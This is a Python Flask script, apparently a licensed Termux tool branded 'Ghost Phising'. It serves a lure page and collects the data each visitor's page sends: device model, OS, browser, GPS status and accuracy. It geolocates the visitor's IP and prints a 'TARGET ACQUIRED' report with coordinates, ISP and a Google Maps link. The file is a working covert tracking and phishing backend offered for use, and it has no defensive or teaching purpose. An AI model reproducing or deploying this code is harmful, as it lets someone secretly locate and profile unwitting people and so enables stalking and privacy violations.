import os, threading, time, sys, random, requests, logging, hashlib, subprocess
from flask import Flask, render_template, request, jsonify, cli
from datetime import datetime, timedelta, timezone

# --- MATIKAN LOGGING FLASK ---
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# --- KODE WARNA ANSI ---
R, G, Y, C, W, B, M, LB = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;36m', '\033[1;37m', '\033[1;34m', '\033[1;35m', '\033[1;94m'
BG_BLUE, BG_RED, RESET = '\033[44m', '\033[41m', '\033[0m'

MUSIC_STATUS = f"{R}Off"
DB_URL = "https://raw.githubusercontent.com/MamzStr/my-database/main/whitelist.txt"
OWNER_ID = "2E8BFDA80AE7"

app = Flask(__name__, template_folder='.')
cli.show_server_banner = lambda *args: None

def get_termux_id():
    id_file = "/data/data/com.termux/files/home/.ghost_id"
    if os.path.exists(id_file):
        with open(id_file, "r") as f: return f.read().strip().upper()
    uid = hashlib.md5(str(random.getrandbits(64)).encode()).hexdigest()[:12].upper()
    with open(id_file, "w") as f: f.write(uid)
    return uid

def check_status():
    my_id = get_termux_id().strip().upper()
    if my_id == OWNER_ID: return "OWNER"
    try:
        res = requests.get(f"{DB_URL}?t={int(time.time())}", timeout=5)
        if res.status_code == 200:
            whitelist = [l.strip().upper() for l in res.text.splitlines() if l.strip()]
            if my_id in whitelist: return "USER"
    except: pass
    return "UNAUTHORIZED"

def auto_play_music():
    global MUSIC_STATUS
    os.system("pkill mpv > /dev/null 2>&1")
    cmd = "mpv --no-video --loop --no-terminal https://d.top4top.io/m_3756clwsz0.mp3 > /dev/null 2>&1"
    subprocess.Popen(cmd, shell=True)
    MUSIC_STATUS = f"{G}On"

def stop_music():
    global MUSIC_STATUS
    os.system("pkill mpv > /dev/null 2>&1")
    MUSIC_STATUS = f"{R}Off"

def clear(): os.system('clear')

def banner(role_name):
    t_now = datetime.now().strftime("%H:%M:%S")
    r_col = R if role_name == "OWNER" else G
    clear()
    print(f"""
{C}⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀           {BG_RED}{W} 💥 GHOST PHISING 💥 {RESET}
{C}⠀⠀⠀⠀⠀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⠀⠀      {C}localhost   {W}: {Y}http://127.0.0.1:8080
{Y}⠀⠀⠀⣠⠞⠁⠀⣀⠀⠀⠀⠀⢀⣀⡀⠀⢀⣀⠀⠀⠀⠀⢀⠀⠈⠱⣄⠀⠀⠀      {G}role        {W}: {r_col}{role_name}
{Y}⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀      {Y}tools       {W}: {W}Ghost_Phsing
{G}⠀⡼⢡⣾⢓⡵⠃⡐⠁⠀⡜⠀⠐⠃⣖⣲⡄⠀⠀⠱⠀⠈⠢⠈⢮⣃⣷⢄⢳⠀      {LB}version     {W}: {W}Version New (stable)
{G}⢰⠃⣿⡹⣫⠃⡌⠀⠄⠈⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠣⠀⠀⠱⠈⣯⡻⣼⠈⡇      {R}Privacy     {W}: {R}Encrypted
{C}⡞⢈⢿⡾⡃⠰⠀⠀⠀⠀⠀⠀⠀⠀⣘⣋⠀⠀⠀⠀⠀⠀⠀⠀⠇⢸⢿⣿⢠⢸      {M}Network     {W}: {W}P2P Stable
{C}⡇⢸⡜⣴⠃⠀⠀⠀⠀⠀⣀⣀⣤⡎⠹⡏⢹⣦⣀⣀⠀⠀⠀⠀⢈⠘⣧⢣⡟⢸      {C}database    {W}: {W}PostgreSQL
{B}⢧⢊⢳⡏⣤⠸⠀⠀⠀⢸⣿⣿⣿⡇⢰⡇⢠⣿⣿⣿⣷⠀⠀⠀⡆⢸⢹⡼⣱⢸      {Y}Strength    {W}: {W}Ghost
{B}⢸⡘⢷⣅⣿⢂⢃⠐⠂⣿⣿⣿⣿⣿⣼⣇⣾⣿⣿⣿⣿⠁⠂⡰⡠⣿⢨⡾⠃⡇      {G}Music       {W}: {MUSIC_STATUS}
{M}⠀⢳⡱⣝⠻⡼⣆⡁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠐⣰⣇⠿⣋⠝⡼⠀      {C}Status      {W}: {G}Active
{M}⠀⠀⢳⡈⢻⠶⣿⣞⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢣⣿⡶⠟⢉⡼⠁⠀      {LB}Time        {W}: {Y}{t_now}
{R}⠀⠀⠀⠙⢦⡑⠲⠶⠾⠿⢟⣿⣿⣿⣿⣿⣿⣿⣿⡛⠿⠷⠶⠶⠊⡡⠋⠀⠀⠀      {R}response    {W}: {W}0.1d
{R}⠀⠀⠀⠀⠀⠙⠦⣝⠛⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⠛⣋⠴⠋⠀⠀⠀⠀⠀      {Y}License Key {W}: {Y}*******
{R}⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠦⠿⣿⣿⣿⣿⣿⣿⠿⠧⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀      {M}Thanks To   {W}: {C}Users

{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

@app.route('/')
def index(): return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_data():
    try:
        d = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        fields = "status,message,continent,country,countryCode,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        geo = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}").json()
        
        lat_ip = geo.get('lat')
        lon_ip = geo.get('lon')
        offset = geo.get('offset', 0)
        t_target = datetime.now(timezone.utc) + timedelta(seconds=offset)
        
        tz_label = ""
        if geo.get('countryCode') == "ID":
            if offset == 25200: tz_label = "WIB"
            elif offset == 28800: tz_label = "WITA"
            elif offset == 32400: tz_label = "WIT"
        else: tz_label = geo.get('timezone')

        sesi_id = f"GPS-GhoPhis{random.randint(1000, 9999)}"

        # HEADER BARU (KEMBALI KE GAYA TARGET ACQUIRED)
        print(f"\n                   {BG_BLUE}{W} ⚡ TARGET ACQUIRED ⚡ {RESET}")
        print(f"{G}[+] BASIC INFO")
        print(f"{Y} • {W}🌐 IP Address   : {G}{ip}")
        print(f"{M} • {W}⏰ Local Time   : {Y}{t_target.strftime('%H:%M:%S')} {tz_label}")
        print(f"{C} • {W}💰 Currency     : {W}{geo.get('currency')}")
        print(f"{LB} • {W}🆔 Session ID   : {M}{sesi_id}")

        print(f"\n{G}[+] DEVICE & SYSTEM")
        print(f"{R} • {W}⚙️ OS Version    : {W}{d.get('os_ver')}")
        print(f"{Y} • {W}📱 Device       : {W}{d.get('device_model')}")
        print(f"{G} • {W}🌍 Browser      : {W}{d.get('browser')}")
        print(f"{C} • {W}🖥️ Resolution    : {W}{d.get('screen')}")

        print(f"\n{G}[+] GEOLOCATION (IP TRACKING)")
        print(f"{M} • {W}🏳️ Country       : {W}{geo.get('country')} ({geo.get('countryCode')})")
        print(f"{LB} • {W}🏢 Location     : {W}{geo.get('city')}, {geo.get('regionName')}")
        print(f"{R} • {W}📍 Coordinates  : {R}{lat_ip}, {lon_ip}")
        print(f"{Y} • {W}📡 GPS Status   : {W}GPS-{d.get('gps_active')}")
        print(f"{G} • {W}🎯 Accuracy     : {Y}{d.get('acc')} meters")
        
        print(f"\n{G}[+] NETWORK")
        print(f"{C} • {W}📡 Provider     : {C}{geo.get('isp')}")
        print(f"{LB} • {W}💻 Hostname     : {C}{geo.get('reverse') or 'None'}")
        print(f"{R} • {W}🏢 Net Owner    : {C}{geo.get('asname')}")
        print(f"{Y} • {W}📶 Net Type     : {W}{d.get('net_type')}")
        
        print(f"\n{G}[+] OSINT LINKS")
        print(f"{G} • {W}🗺️ Google Maps   : {B}https://www.google.com/maps?q={lat_ip},{lon_ip}")
        print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
    except: pass
    return jsonify({"status": "ok"})

def run_flask():
    app.run(host='0.0.0.0', port=8080, threaded=True, debug=False, use_reloader=False)

def start_server(role):
    banner(role)
    threading.Thread(target=run_flask, daemon=True).start()
    time.sleep(2)
    while True:
        cmd = input("").strip().lower()
        if cmd == "exit": stop_music(); sys.exit()
        elif cmd == "logclear": banner(role)
        elif cmd == "onmusic": auto_play_music(); banner(role); print(f"{G}[+] Music On")
        elif cmd == "offmusic": stop_music(); banner(role); print(f"{R}[-] Music Off")

def login_system():
    while True:
        clear()
        print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {W}SISTEM LISENSI GHOST-PHISING 🗝️ {R}[VIP]\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {C}• {W}getkey    {Y}: Ambil ID Unit\n {C}• {W}verifkey  {Y}: Masuk ke Tools\n\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        cmd = input(f"{W}Ghost > {G}").strip().lower()
        if cmd == "getkey": 
            print(f"{Y}[!] ID Unit Lu: {W}{get_termux_id()}"); input("\nTekan Enter...")
        elif cmd == "verifkey":
            print(f"{Y}[*] Memverifikasi ID..."); time.sleep(1)
            status = check_status()
            if status in ["OWNER", "USER"]:
                print(f"{G}[+] Akses Diterima karena terdaftar di database!"); time.sleep(1)
                auto_play_music()
                start_server(status); break
            else:
                print(f"{R}[!] ID Lu Belum Terdaftar!"); input("\nTekan Enter...")
        elif cmd == "onmusic": auto_play_music(); print(f"{G}[+] Music On")
        elif cmd == "offmusic": stop_music(); print(f"{R}[-] Music Off")

if __name__ == '__main__':
    try: login_system()
    except KeyboardInterrupt: stop_music(); sys.exit()
